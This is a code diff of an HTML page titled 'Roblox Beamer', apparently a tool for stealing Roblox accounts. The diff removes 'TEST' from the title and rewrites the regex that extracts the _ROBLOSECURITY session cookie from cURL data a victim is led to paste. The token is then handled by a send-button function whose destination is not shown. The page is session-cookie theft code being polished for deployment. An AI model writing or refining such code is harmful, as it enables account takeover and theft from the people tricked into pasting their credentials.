@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TEST Roblox Beamer</title>
+  <title>Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -58,7 +58,7 @@
       const sendButton = document.getElementById("sendButton");
       let message = messageInput.value;
 
-      // Extract the _ROBLOSECURITY token from the copied cURL data
+      // Extract the .ROBLOSECURITY token from the copied cURL data
       const robloSecurityCode = extractRobloSecurityToken(message);
 
       if (robloSecurityCode) {
@@ -101,8 +101,8 @@
     }
 
     function extractRobloSecurityToken(curlText) {
-      // Regular expression to extract _ROBLOSECURITY token from cURL format
-      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+)(?=\s|$)/;
+      // Regular expression to extract the _ROBLOSECURITY token
+      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+);/; // Expecting _ROBLOSECURITY=token;
       const match = curlText.match(robloSecurityCodeRegex);
 
       if (match && match[1]) {
